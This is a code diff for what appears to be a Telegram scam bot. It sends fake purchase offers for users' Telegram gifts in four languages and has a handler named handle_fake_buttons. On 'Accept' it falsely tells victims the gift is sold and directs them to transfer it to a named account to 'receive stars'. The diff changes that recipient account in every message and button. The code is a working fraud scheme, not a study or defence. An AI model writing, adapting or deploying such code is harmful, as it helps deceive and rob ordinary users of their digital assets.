@@ -16,7 +16,7 @@ ADMIN_ID = None
 MESSAGES = {
     "ru": {
         "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/lyizi002'>@lyizi002</a> для зачисления звёзд.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд.",
         "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
         "btn_accept": "Принять",
         "btn_decline": "Отклонить",
@@ -24,7 +24,7 @@ MESSAGES = {
     },
     "en": {
         "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/lyizi002'>@lyizi002</a> to receive stars.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> to receive stars.",
         "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
         "btn_accept": "Accept",
         "btn_decline": "Decline",
@@ -32,7 +32,7 @@ MESSAGES = {
     },
     "ua": {
         "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/lyizi002'>@lyizi002</a> для зарахування зірок.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зарахування зірок.",
         "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
         "btn_accept": "Прийняти",
         "btn_decline": "Відхилити",
@@ -40,7 +40,7 @@ MESSAGES = {
     },
     "ar": {
         "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/lyizi002'>@lyizi002</a> لاستلام النجوم.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> لاستلام النجوم.",
         "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
         "btn_accept": "قبول",
         "btn_decline": "رفض",
@@ -167,7 +167,7 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         if action == "accept":
             new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
             new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/lyizi002")]
+                [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
             ])
         else:
             new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
